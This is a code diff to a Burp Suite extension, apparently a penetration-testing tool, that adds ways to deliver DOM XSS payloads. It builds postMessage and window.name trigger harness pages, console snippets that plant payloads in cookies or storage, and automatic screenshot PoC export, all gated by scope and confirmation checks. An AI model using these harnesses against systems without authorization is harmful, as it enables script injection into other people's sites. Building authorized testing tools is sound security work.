@@ -62,7 +62,7 @@ import re
 import time
 
 
-VERSION = "1.5.0"
+VERSION = "1.6.0"
 AUTHZ_FILENAME = ".js_recon_authorization"
 
 
@@ -1389,6 +1389,96 @@ def _source_from_snippet(snippet):
             "Place the payload into the user-controllable input (parameter, field, storage, or message) that reaches this sink.")
 
 
+def _js_str(payload):
+    """payload as a single-quoted JS/HTML-attribute-safe string literal."""
+    return "'" + payload.replace("\\", "\\\\").replace("'", "\\'") + "'"
+
+
+def injected_line(finding, payload):
+    """The effective code once the payload reaches the sink -- what actually
+    executes -- so a reviewer sees the injection, not just the source line."""
+    sink = finding.get("sinkType", "")
+    target = finding.get("target", "") or sink
+    lit = _js_str(payload)
+    if sink in ("innerHTML", "outerHTML", "srcdoc"):
+        return u"%s = %s;" % (target, lit)
+    if sink in ("write", "writeln"):
+        return u"%s(%s);" % (target or "document.write", lit)
+    if sink in ("insertAdjacentHTML", "setHTML"):
+        return u"%s('beforeend', %s);" % (target, lit)
+    if sink == "jquery-html":
+        return u"$(...).%s(%s);" % (target, lit)
+    if sink == "jquery-selector":
+        return u"$(%s);" % lit
+    if sink in ("eval",):
+        return u"eval(%s);" % lit
+    if sink == "Function-constructor":
+        return u"new Function(%s)();" % lit
+    if sink in ("setTimeout-string-arg", "setInterval-string-arg"):
+        base = "setTimeout" if "setTimeout" in sink else "setInterval"
+        return u"%s(%s, 0);" % (base, lit)
+    if sink == "message-listener":
+        return u"// handler runs: event.data = %s  ->  reaches the sink" % lit
+    # navigation sinks
+    return u"%s = %s;" % (target, lit)
+
+
+def build_trigger(page_url, source_key, payload):
+    """How to actually deliver the payload for this source. Returns a dict:
+      mode: 'url'     -> open `url`
+            'harness'  -> write `harness` HTML, open it (postMessage/window.name)
+            'console'  -> paste `console` JS in the target's DevTools, reload
+            'manual'   -> only `steps` apply (referrer/unknown)
+    """
+    page_url = (page_url or "").strip()
+    if not page_url:
+        return {"mode": "manual", "note": "Set the target page URL first.", "steps": []}
+
+    if source_key in _URL_SOURCE_KEYS:
+        url, note = build_test_url(page_url, source_key, payload)
+        return {"mode": "url", "url": url, "note": note}
+
+    pj = _js_str(payload)
+    if source_key == ".data":  # postMessage
+        harness = (
+            u"<!doctype html><html><head><meta charset='utf-8'><title>JS Recon postMessage PoC</title></head>"
+            u"<body><h3>JS Recon postMessage PoC harness</h3>"
+            u"<p>Target: %s</p>"
+            u"<iframe id='t' src='%s' style='width:95%%;height:420px'></iframe>"
+            u"<script>var P=%s;var f=document.getElementById('t');"
+            u"f.onload=function(){try{f.contentWindow.postMessage(P,'*');}catch(e){}};"
+            u"setTimeout(function(){try{var w=window.open('%s');setTimeout(function(){try{w&&w.postMessage(P,'*');}catch(e){}},1500);}catch(e){}},600);"
+            u"</script></body></html>" % (page_url, page_url, pj, page_url))
+        return {"mode": "harness", "harness": harness,
+                "note": "Opens the target and postMessages the payload to it (iframe + popup).",
+                "steps": ["Open the generated harness page.",
+                          "It loads the target and sends the payload via postMessage.",
+                          "If the handler lacks an origin check, the sink fires."]}
+    if source_key == "window.name":
+        harness = (
+            u"<!doctype html><html><head><meta charset='utf-8'><title>JS Recon window.name PoC</title></head>"
+            u"<body><script>window.name=%s;location='%s';</script>"
+            u"<p>Setting window.name and navigating to the target...</p></body></html>" % (pj, page_url))
+        return {"mode": "harness", "harness": harness,
+                "note": "Sets window.name to the payload, then navigates to the target (window.name persists across navigation).",
+                "steps": ["Open the generated harness page; it sets window.name and redirects to the target."]}
+    if source_key in ("document.cookie", "localstorage", "sessionstorage"):
+        if source_key == "document.cookie":
+            snippet = u"document.cookie = 'NAME=' + %s;  // use the cookie name this code reads\nlocation.reload();" % pj
+        else:
+            store = "localStorage" if source_key == "localstorage" else "sessionStorage"
+            snippet = u"%s.setItem('KEY', %s);  // use the storage key this code reads\nlocation.reload();" % (store, pj)
+        return {"mode": "console", "console": snippet,
+                "note": "Same-origin only: set the value this code reads, then reload.",
+                "steps": ["Open the target page.",
+                          "Open DevTools > Console and paste the snippet (set NAME/KEY to the real one).",
+                          "The page reloads and the sink reads the payload."]}
+    # referrer / unknown
+    return {"mode": "manual",
+            "note": "This source needs a manual trigger (e.g. a referring link or app-specific input).",
+            "steps": []}
+
+
 def poc_details(finding, source_file=None, host=None):
     """Full PoC record for one DOM XSS finding: exact payload + how to replicate."""
     marker, payload = payload_for_finding(finding)
@@ -1427,6 +1517,8 @@ def poc_details(finding, source_file=None, host=None):
         "source": source_name,
         "line": finding.get("line"),
         "snippet": finding.get("snippet", ""),
+        "injected": injected_line(finding, payload),
+        "sourceKey": finding.get("sourceKey"),
         "sourceFile": source_file,
         "host": host,
         "steps": steps,
@@ -1856,7 +1948,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
         self._page_url_field.setToolTipText("The page that LOADS the vulnerable script (not the .js URL). Prefilled from the selected finding's host; edit as needed.")
         toolbar2.add(self._page_url_field)
         fire_btn = JButton("Fire in browser", actionPerformed=self._on_fire_in_browser)
-        fire_btn.setToolTipText("Build the test URL for the selected DOM XSS finding and open it in your default browser (in-scope hosts only). Active test -- confirms before opening.")
+        fire_btn.setToolTipText("Deliver the payload for the selected finding: URL sources open a test URL; postMessage/window.name open a trigger harness; cookie/storage give a console snippet. In-scope hosts only; confirms first.")
+        fire_cap_btn = JButton("Fire + capture PoC", actionPerformed=self._on_fire_capture_poc)
+        fire_cap_btn.setToolTipText("Fire, then after the delay auto-capture the screen and save this finding as a PoC (HTML + Markdown) with the screenshot.")
+        toolbar2.add(fire_cap_btn)
+        toolbar2.add(JLabel("Capture delay s"))
+        self._delay_field = JTextField("4", 2)
+        self._delay_field.setToolTipText("Seconds to wait after firing before the automatic screenshot (time for the alert to appear).")
+        toolbar2.add(self._delay_field)
         shot_btn = JButton("Capture screenshot", actionPerformed=self._on_capture_screenshot)
         shot_btn.setToolTipText("Capture the current screen (showing the alert) and attach it to the selected finding for the PoC report.")
         attach_btn = JButton("Attach screenshot file", actionPerformed=self._on_attach_screenshot)
@@ -2259,6 +2358,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
     </table>
     <h3>Vulnerable code</h3>
     <pre class="code">%s</pre>
+    <h3>Effective code after injecting the payload</h3>
+    <pre class="code">%s</pre>
     <h3>Exact payload (copy verbatim)</h3>
     <pre class="payload">%s</pre>
     <h3>Steps to reproduce</h3>
@@ -2270,7 +2371,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
                 _esc(r["sink"]), _esc(r.get("target", "")),
                 "yes (heuristic)" if r["tainted"] else "not confirmed",
                 _esc(r["source"]), _esc(r["context"]), _esc(r["marker"]),
-                _esc(r["snippet"]), _esc(r["payload"]), steps, shot))
+                _esc(r["snippet"]), _esc(r.get("injected", "")), _esc(r["payload"]), steps, shot))
         guide = u"".join(u"<li>%s</li>" % _esc(s) for s in EXECUTION_GUIDE)
         how_to = (u'<h2>How to execute a DOM XSS (general method)</h2>'
                   u'<ol class="guide">%s</ol>' % guide)
@@ -2332,6 +2433,12 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
             out.append(u"")
             out.append(u"```js")
             out.append(r["snippet"])
+            out.append(u"```")
+            out.append(u"")
+            out.append(u"**Effective code after injecting the payload:**")
+            out.append(u"")
+            out.append(u"```js")
+            out.append(r.get("injected", ""))
             out.append(u"```")
             out.append(u"")
             out.append(u"**Exact payload:**")
@@ -2455,8 +2562,35 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
         except Exception:
             return u""
 
+    def _browse(self, url_or_file_uri):
+        from java.awt import Desktop
+        from java.net import URI
+        if Desktop.isDesktopSupported() and Desktop.getDesktop().isSupported(Desktop.Action.BROWSE):
+            Desktop.getDesktop().browse(URI(url_or_file_uri))
+            return True
+        return False
+
+    def _write_harness(self, marker, html):
+        from java.io import File as _JFile
+        tmp = _JFile(_u(System.getProperty("java.io.tmpdir")), u"jsrecon-trigger-%s.html" % marker)
+        with codecs.open(_u(tmp.getAbsolutePath()), "w", "utf-8") as f:
+            f.write(html)
+        return _u(tmp.toURI().toString()), _u(tmp.getAbsolutePath())
+
+    def _capture_delay(self):
+        try:
+            return max(0, min(30, int(_u(self._delay_field.getText()).strip() or "4")))
+        except Exception:
+            return 4
+
     def _on_fire_in_browser(self, evt):
-        item, finding = self._selected_xss("Fire in browser")
+        self._fire(auto_capture=False)
+
+    def _on_fire_capture_poc(self, evt):
+        self._fire(auto_capture=True)
+
+    def _fire(self, auto_capture):
+        item, finding = self._selected_xss("Fire")
         if finding is None:
             return
         if not self._is_authorized(item):
@@ -2466,43 +2600,109 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
         rec = poc_details(finding, source_file=item["url"], host=item["host"])
         page_url = self._default_page_url(item)
         self._page_url_field.setText(page_url)
-        test_url, note = build_test_url(page_url, finding.get("sourceKey"), payload)
-        if not test_url:
+        trig = build_trigger(page_url, finding.get("sourceKey"), payload)
+        mode = trig["mode"]
+
+        if mode == "manual":
             JOptionPane.showMessageDialog(
                 self._root,
-                u"Automatic firing is only available for URL-based sources.\n\n"
-                u"Source: %s\nReason: %s\n\nUse these manual steps:\n- %s" % (
-                    rec["source"], note, u"\n- ".join(rec["steps"])),
-                "JS Recon - Fire in browser", JOptionPane.INFORMATION_MESSAGE)
+                u"This source (%s) can't be fired from a URL.\n\n%s\n\nManual steps:\n- %s" % (
+                    rec["source"], trig.get("note", ""), u"\n- ".join(rec["steps"])),
+                "JS Recon - Fire", JOptionPane.INFORMATION_MESSAGE)
             return
-        # Editable confirmation: the user sees and can fix the exact URL before
-        # anything opens. This is an ACTIVE test against the live target.
-        edited = JOptionPane.showInputDialog(
-            self._root,
-            u"This will OPEN the live target in your default browser to fire a DOM XSS PoC.\n"
-            u"Host is in Burp scope (authorized). %s\n\n"
-            u"Review/edit the exact URL, then OK to open (Cancel to abort):" % note,
-            test_url)
-        if edited is None:
-            self._status.setText("Fire cancelled.")
+
+        if mode == "console":
+            snippet = trig["console"]
+            self._clip(snippet)
+            opened = False
+            try:
+                opened = self._browse(page_url)
+            except Exception:
+                opened = False
+            JOptionPane.showMessageDialog(
+                self._root,
+                u"%s source.\n\nThe console snippet below is COPIED to your clipboard%s:\n\n%s\n\n"
+                u"Open DevTools (F12) > Console on the target, paste it, run, and the page reloads with the payload." % (
+                    rec["source"], " and the target was opened" if opened else "", snippet),
+                "JS Recon - Fire (console trigger)", JOptionPane.INFORMATION_MESSAGE)
+            if auto_capture:
+                self._schedule_capture(item, finding, note="paste the console snippet, then the alert appears")
             return
-        edited = _u(edited).strip()
-        if not edited:
-            return
+
+        # mode == 'url' or 'harness'
+        if mode == "url":
+            edited = JOptionPane.showInputDialog(
+                self._root,
+                u"ACTIVE TEST: opens the live target in your default browser.\n"
+                u"Host is in Burp scope (authorized). %s\n\n"
+                u"Tip: to use Burp's embedded browser instead, cancel and paste this URL there "
+                u"(the extension API can't open Burp's browser directly).\n\n"
+                u"Review/edit the exact URL, then OK to open:" % trig.get("note", ""),
+                trig["url"])
+            if edited is None:
+                self._status.setText("Fire cancelled.")
+                return
+            edited = _u(edited).strip()
+            if not edited:
+                return
+            target_uri = edited
+            what = u"PoC URL"
+        else:  # harness
+            uri, fpath = self._write_harness(marker, trig["harness"])
+            ok = JOptionPane.showConfirmDialog(
+                self._root,
+                u"ACTIVE TEST (%s): a local trigger page will open in your default browser and "
+                u"deliver the payload to the target.\n%s\nHarness: %s\n\nProceed?" % (
+                    rec["source"], trig.get("note", ""), fpath),
+                "JS Recon - Fire (trigger harness)", JOptionPane.OK_CANCEL_OPTION)
+            if ok != JOptionPane.OK_OPTION:
+                self._status.setText("Fire cancelled.")
+                return
+            target_uri = uri
+            what = u"trigger harness"
+
         try:
-            from java.awt import Desktop
-            from java.net import URI
-            if Desktop.isDesktopSupported() and Desktop.getDesktop().isSupported(Desktop.Action.BROWSE):
-                Desktop.getDesktop().browse(URI(edited))
-                msg = u"Opened PoC URL in default browser (marker %s). When the alert shows, click 'Capture screenshot'." % marker
+            if self._browse(target_uri):
+                msg = u"Opened %s in default browser (marker %s)." % (what, marker)
+                if auto_capture:
+                    msg += u" Auto-capturing the screen in %ds -- make sure the alert is visible." % self._capture_delay()
+                else:
+                    msg += u" When the alert shows, click 'Capture screenshot'."
                 self._log(msg)
                 self._status.setText(msg)
+                if auto_capture:
+                    self._schedule_capture(item, finding, note="")
             else:
-                self._clip(edited)
-                self._notify("Desktop browse not supported here; the URL was copied to the clipboard - paste it into your browser.")
+                self._clip(target_uri)
+                self._notify("Desktop browse not supported here; the URL/file was copied to the clipboard.")
         except Exception as e:
-            self._clip(edited)
-            self._notify("Could not open browser (%s); URL copied to clipboard instead." % e)
+            self._clip(target_uri)
+            self._notify("Could not open browser (%s); copied to clipboard instead." % e)
+
+    def _schedule_capture(self, item, finding, note):
+        """After a delay (so the alert is on screen), capture the screen and
+        attach it, then offer to export this finding as a PoC. Runs the wait
+        off the EDT."""
+        delay = self._capture_delay()
+
+        def worker():
+            try:
+                Thread.sleep(int(delay * 1000))
+            except Exception:
+                pass
+            self._on_edt(lambda: self._auto_capture_then_poc(item, finding))
+
+        t = Thread(_RunnableFn(worker))
+        t.setDaemon(True)
+        t.start()
+
+    def _auto_capture_then_poc(self, item, finding):
+        ok = self._capture_to(finding)
+        if not ok:
+            self._notify("Auto screenshot failed; click 'Capture screenshot' manually once the alert is visible.")
+            return
+        self._status.setText("Screenshot captured. Exporting this finding as a PoC...")
+        self._export_single_poc(item, finding)
 
     def _clip(self, text):
         try:
@@ -2510,10 +2710,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
         except Exception:
             pass
 
-    def _on_capture_screenshot(self, evt):
-        item, finding = self._selected_xss("Capture screenshot")
-        if finding is None:
-            return
+    def _capture_to(self, finding):
+        """Screen-capture to PNG, attach to the finding's marker. Returns bool."""
         marker = _stable_marker(finding)
         try:
             from java.awt import Robot, Rectangle
@@ -2525,13 +2723,57 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IExt
             baos = ByteArrayOutputStream()
             ImageIO.write(img, "png", baos)
             data = baos.toByteArray()
-            b64 = _u(Base64.getEncoder().encodeToString(data))
-            self._shots[marker] = {"b64": b64, "bytes": data}
-            msg = u"Screenshot captured and attached to finding %s (%d bytes). It will appear in the PoC report." % (marker, len(data))
+            self._shots[marker] = {"b64": _u(Base64.getEncoder().encodeToString(data)),
+                                   "bytes": data, "mime": "image/png"}
+            msg = u"Screenshot captured and attached to finding %s (%d bytes)." % (marker, len(data))
             self._log(msg)
             self._status.setText(msg)
+            return True
         except Exception as e:
-            self._notify("Screenshot capture failed (%s). Use 'Attach screenshot file' instead." % e)
+            self._log("Screenshot capture failed: %s" % e)
+            return False
+
+    def _on_capture_screenshot(self, evt):
+        item, finding = self._selected_xss("Capture screenshot")
+        if finding is None:
+            return
+        if not self._capture_to(finding):
+            self._notify("Screenshot capture failed. Use 'Attach screenshot file' instead.")
+
+    def _export_single_poc(self, item, finding):
+        """Write a one-finding PoC report (HTML + MD) with its screenshot."""
+        rec = poc_details(finding, source_file=item["url"], host=item["host"])
+        shot = self._shots.get(rec["marker"])
+        if shot:
+            rec["shot_b64"] = shot["b64"]
+            rec["shot_mime"] = shot.get("mime", "image/png")
+            rec["shot_bytes"] = shot.get("bytes")
+        try:
+            from javax.swing import JFileChooser
+            chooser = JFileChooser()
+            chooser.setDialogTitle("Save PoC for this finding")
+            chooser.setSelectedFile(File("poc-%s.html" % rec["marker"]))
+            if chooser.showSaveDialog(self._root) != JFileChooser.APPROVE_OPTION:
+                self._status.setText("Screenshot attached; PoC not saved (cancelled). Use Export PoCs later.")
+                return
+            path = _u(chooser.getSelectedFile().getAbsolutePath())
+        except Exception as e:
+            self._notify("Save dialog error: %s" % e)
+            return
+        html_path = path if path.lower().endswith((".html", ".htm")) else path + ".html"
+        md_path = (html_path[:html_path.rfind(".")] if "." in html_path else html_path) + ".md"
+        try:
+            self._write_poc_html(html_path, [rec], 0)
+            self._write_poc_md(md_path, [rec], 0)
+            msg = u"PoC saved: %s and %s" % (html_path, md_path)
+            self._log(msg)
+            self._status.setText(msg)
+            try:
+                self._browse(File(html_path).toURI().toString())
+            except Exception:
+                pass
+        except Exception as e:
+            self._notify("PoC export error: %s" % e)
 
     def _on_attach_screenshot(self, evt):
         item, finding = self._selected_xss("Attach screenshot")
